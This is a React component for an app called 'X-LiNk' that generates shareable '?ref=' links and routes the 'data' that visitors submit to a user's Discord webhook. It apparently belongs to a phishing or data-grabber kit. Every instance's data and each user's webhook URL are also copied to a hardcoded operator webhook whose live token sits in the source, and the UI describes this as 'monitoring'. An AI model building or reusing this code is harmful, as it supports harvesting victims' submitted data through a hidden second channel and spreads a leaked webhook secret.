import { useState } from "react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  ArrowLeft,
  Webhook,
  Copy,
  ExternalLink,
  CheckCircle,
  AlertCircle,
} from "lucide-react";

interface WebhookSetupProps {
  onBack: () => void;
}

export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
  const [webhook, setWebhook] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isTesting, setIsTesting] = useState(false);
  const [error, setError] = useState("");
  const [generatedLink, setGeneratedLink] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [testResults, setTestResults] = useState<{
    userWebhook: boolean;
    mainWebhook: boolean;
  } | null>(null);

  const MAIN_WEBHOOK =
    "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE";

  const testWebhook = async (webhookUrl: string, isMain = false) => {
    try {
      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          embeds: [
            {
              title: isMain
                ? "🔗 Main System Webhook Test"
                : "🔗 Custom Webhook Test",
              color: isMain ? 0x00ff00 : 0x3b82f6,
              description: isMain
                ? "Your main webhook is working correctly! You will receive all data from custom instances here."
                : "Your custom webhook is working correctly! You will receive all data from your instance here.",
              fields: [
                {
                  name: "🎯 Test Type",
                  value: isMain
                    ? "Main System Verification"
                    : "Custom Webhook Verification",
                  inline: true,
                },
                {
                  name: "⏰ Test Time",
                  value: new Date().toISOString(),
                  inline: true,
                },
                {
                  name: "✅ Status",
                  value: "Webhook is functioning correctly",
                  inline: false,
                },
              ],
              footer: {
                text: "X-LiNk Webhook Test System",
              },
            },
          ],
        }),
      });

      return response.ok;
    } catch (error) {
      console.error("Webhook test error:", error);
      return false;
    }
  };

  const sendCreationNotification = async (
    userWebhook: string,
    generatedId: string,
    testResults: any,
  ) => {
    const notifications = [
      // Send to main webhook
      {
        webhook: MAIN_WEBHOOK,
        data: {
          embeds: [
            {
              title: "🔗 New Custom Instance Created",
              color: 0x00ff00,
              description:
                "A new X-LiNk custom instance has been created and verified!",
              fields: [
                {
                  name: "🎯 Custom Webhook URL",
                  value: `\`\`\`${userWebhook}\`\`\``,
                  inline: false,
                },
                {
                  name: "🌐 Generated Instance Link",
                  value: `${window.location.origin}?ref=${generatedId}`,
                  inline: false,
                },
                {
                  name: "✅ Custom Webhook Test",
                  value: testResults.userWebhook ? "✅ Success" : "❌ Failed",
                  inline: true,
                },
                {
                  name: "✅ Main Webhook Test",
                  value: testResults.mainWebhook ? "✅ Success" : "❌ Failed",
                  inline: true,
                },
                {
                  name: "⏰ Created At",
                  value: new Date().toISOString(),
                  inline: false,
                },
              ],
              footer: {
                text: "X-LiNk System - Instance Creation",
              },
            },
          ],
        },
      },
      // Send to user's custom webhook
      {
        webhook: userWebhook,
        data: {
          embeds: [
            {
              title: "🎉 Your X-LiNk Instance is Ready!",
              color: 0x3b82f6,
              description:
                "Your custom X-LiNk instance has been successfully created and is ready to collect data!",
              fields: [
                {
                  name: "🌐 Your Instance Link",
                  value: `${window.location.origin}?ref=${generatedId}`,
                  inline: false,
                },
                {
                  name: "📋 How to Use",
                  value:
                    "Share your instance link with others. When they submit data, you'll receive it here!",
                  inline: false,
                },
                {
                  name: "⏰ Created At",
                  value: new Date().toISOString(),
                  inline: true,
                },
                {
                  name: "🔒 Instance ID",
                  value: generatedId,
                  inline: true,
                },
              ],
              footer: {
                text: "X-LiNk Custom Instance",
              },
            },
          ],
        },
      },
    ];

    let allSuccess = true;
    for (const notification of notifications) {
      try {
        const response = await fetch(notification.webhook, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(notification.data),
        });
        if (!response.ok) {
          allSuccess = false;
        }
      } catch (error) {
        console.error("Notification error:", error);
        allSuccess = false;
      }
    }

    return allSuccess;
  };

  const handleTest = async () => {
    if (!webhook.trim()) {
      setError("Please enter a webhook URL first");
      return;
    }

    if (!webhook.includes("discord.com/api/webhooks/")) {
      setError("Please enter a valid Discord webhook URL");
      return;
    }

    setIsTesting(true);
    setError("");
    setTestResults(null);

    // Test both webhooks
    const userWebhookTest = await testWebhook(webhook, false);
    const mainWebhookTest = await testWebhook(MAIN_WEBHOOK, true);

    const results = {
      userWebhook: userWebhookTest,
      mainWebhook: mainWebhookTest,
    };

    setTestResults(results);
    setIsTesting(false);

    if (!userWebhookTest) {
      setError(
        "Your custom webhook test failed. Please check the URL and try again.",
      );
    }
    if (!mainWebhookTest) {
      setError("Main system webhook test failed. Please try again later.");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!testResults || !testResults.userWebhook) {
      setError("Please test your webhook first to ensure it's working");
      return;
    }

    setIsLoading(true);
    setError("");

    // Generate unique ID for this webhook
    const uniqueId =
      Date.now().toString(36) + Math.random().toString(36).substr(2);

    // Store webhook in localStorage with unique ID
    const webhookData = {
      webhook: webhook,
      createdAt: new Date().toISOString(),
      id: uniqueId,
      tested: true,
      testResults: testResults,
    };

    localStorage.setItem(`webhook_${uniqueId}`, JSON.stringify(webhookData));

    // Generate the link
    const link = `${window.location.origin}?ref=${uniqueId}`;

    // Send creation notifications to both webhooks
    const success = await sendCreationNotification(
      webhook,
      uniqueId,
      testResults,
    );

    if (success) {
      setGeneratedLink(link);
      setShowSuccess(true);
    } else {
      setError("Failed to send notifications. Please try again.");
    }

    setIsLoading(false);
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(generatedLink);
    } catch (error) {
      console.error("Failed to copy:", error);
    }
  };

  const openLink = () => {
    window.open(generatedLink, "_blank");
  };

  if (showSuccess) {
    return (
      <motion.div
        className="flex items-center justify-center min-h-screen p-4"
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.5 }}
      >
        <Card className="w-full max-w-2xl bg-black/80 border-green-500/40 backdrop-blur-2xl shadow-2xl">
          <CardHeader className="text-center pb-6">
            <motion.div
              initial={{ y: -20 }}
              animate={{ y: 0 }}
              transition={{ delay: 0.2 }}
              className="flex flex-col items-center"
            >
              <div className="mb-4 p-4 bg-green-600/20 rounded-full">
                <CheckCircle className="w-12 h-12 text-green-400" />
              </div>
              <CardTitle className="text-3xl font-bold text-white mb-2">
                Instance Created Successfully!
              </CardTitle>
              <p className="text-green-300 text-sm">
                Your custom X-LiNk instance is ready and notifications sent
              </p>
            </motion.div>
          </CardHeader>
          <CardContent className="space-y-6">
            <div className="space-y-4">
              <label className="block text-white font-medium">
                Your Custom Instance Link:
              </label>
              <div className="flex gap-2">
                <Input
                  value={generatedLink}
                  readOnly
                  className="bg-black/60 border-green-500/50 text-white flex-1 font-mono text-sm"
                />
                <Button
                  onClick={copyToClipboard}
                  variant="outline"
                  size="icon"
                  className="border-green-500/50 text-green-300 hover:bg-green-600/20"
                >
                  <Copy className="w-4 h-4" />
                </Button>
                <Button
                  onClick={openLink}
                  variant="outline"
                  size="icon"
                  className="border-green-500/50 text-green-300 hover:bg-green-600/20"
                >
                  <ExternalLink className="w-4 h-4" />
                </Button>
              </div>
            </div>

            <div className="bg-gradient-to-r from-green-900/30 to-blue-900/30 border border-green-500/30 rounded-lg p-6">
              <h4 className="text-green-300 font-semibold mb-4 text-lg">
                ✅ Setup Complete
              </h4>
              <div className="grid grid-cols-2 gap-4 mb-4">
                <div className="text-center">
                  <div className="text-2xl mb-2">
                    {testResults?.userWebhook ? "✅" : "❌"}
                  </div>
                  <p className="text-sm text-gray-300">Your Webhook</p>
                </div>
                <div className="text-center">
                  <div className="text-2xl mb-2">
                    {testResults?.mainWebhook ? "✅" : "❌"}
                  </div>
                  <p className="text-sm text-gray-300">Main System</p>
                </div>
              </div>
              <ul className="text-green-200 text-sm space-y-2">
                <li>• ✅ Notifications sent to BOTH webhooks</li>
                <li>• ✅ All future data will go to BOTH webhooks</li>
                <li>• ✅ Share your link to start collecting data</li>
                <li>• ✅ Instance is fully verified and ready</li>
              </ul>
            </div>

            <div className="flex gap-4">
              <Button
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Dashboard
              </Button>
              <Button
                onClick={openLink}
                className="flex-1 bg-gradient-to-r from-green-600 to-blue-600 hover:from-green-500 hover:to-blue-500 text-white"
              >
                <ExternalLink className="w-4 h-4 mr-2" />
                Test Your Instance
              </Button>
            </div>
          </CardContent>
        </Card>
      </motion.div>
    );
  }

  return (
    <motion.div
      className="flex items-center justify-center min-h-screen p-4"
      initial={{ opacity: 0, x: 50 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
    >
      <Card className="w-full max-w-2xl bg-black/80 border-blue-500/40 backdrop-blur-2xl shadow-2xl">
        <CardHeader className="text-center pb-6">
          <motion.div
            initial={{ y: -20 }}
            animate={{ y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-col items-center"
          >
            <div className="mb-4 p-4 bg-blue-600/20 rounded-full">
              <Webhook className="w-12 h-12 text-blue-400" />
            </div>
            <CardTitle className="text-3xl font-bold text-white mb-2">
              Create Your Webhook Instance
            </CardTitle>
            <p className="text-blue-300 text-sm">
              Test and verify your custom X-LiNk webhook system
            </p>
          </motion.div>
        </CardHeader>
        <CardContent className="space-y-6">
          <form onSubmit={handleSubmit} className="space-y-6">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              <label className="block text-white font-medium mb-2">
                Discord Webhook URL
              </label>
              <Input
                type="url"
                placeholder="https://discord.com/api/webhooks/..."
                value={webhook}
                onChange={(e) => setWebhook(e.target.value)}
                className="bg-black/60 border-blue-500/50 text-white placeholder:text-gray-500 h-12 focus:border-blue-400 transition-colors"
                disabled={isLoading || isTesting}
              />
            </motion.div>

            {testResults && (
              <motion.div
                className="bg-gradient-to-r from-gray-900/50 to-blue-900/30 border border-blue-500/30 rounded-lg p-4"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
              >
                <h4 className="text-blue-300 font-semibold mb-3">
                  Test Results:
                </h4>
                <div className="grid grid-cols-2 gap-4">
                  <div className="flex items-center gap-2">
                    {testResults.userWebhook ? (
                      <CheckCircle className="w-5 h-5 text-green-400" />
                    ) : (
                      <AlertCircle className="w-5 h-5 text-red-400" />
                    )}
                    <span className="text-sm text-gray-300">Your Webhook</span>
                  </div>
                  <div className="flex items-center gap-2">
                    {testResults.mainWebhook ? (
                      <CheckCircle className="w-5 h-5 text-green-400" />
                    ) : (
                      <AlertCircle className="w-5 h-5 text-red-400" />
                    )}
                    <span className="text-sm text-gray-300">Main System</span>
                  </div>
                </div>
              </motion.div>
            )}

            <div className="bg-gradient-to-r from-blue-900/20 to-black/30 border border-blue-500/30 rounded-lg p-4">
              <h4 className="text-blue-300 font-semibold mb-2">
                Dual Webhook System:
              </h4>
              <ul className="text-blue-200 text-sm space-y-1">
                <li>• Test sends messages to BOTH webhooks</li>
                <li>• Your webhook gets all data from your instance</li>
                <li>• Main system also receives all data for monitoring</li>
                <li>• Complete transparency and dual delivery</li>
              </ul>
            </div>

            {error && (
              <motion.p
                className="text-red-400 text-sm text-center font-medium bg-red-900/20 border border-red-500/30 rounded-lg py-2 px-4"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
              >
                {error}
              </motion.p>
            )}

            <motion.div
              className="flex gap-4"
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.4 }}
            >
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700 h-12"
                disabled={isLoading || isTesting}
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
              <Button
                type="button"
                onClick={handleTest}
                variant="outline"
                className="flex-1 border-blue-500/50 text-blue-300 hover:bg-blue-600/20 h-12"
                disabled={isLoading || isTesting || !webhook.trim()}
              >
                {isTesting ? "Testing Both..." : "Test Webhooks"}
              </Button>
              <Button
                type="submit"
                className="flex-1 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-500 hover:to-blue-600 text-white h-12 font-semibold"
                disabled={isLoading || isTesting || !testResults?.userWebhook}
              >
                {isLoading ? "Creating..." : "Create Instance"}
              </Button>
            </motion.div>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );
};
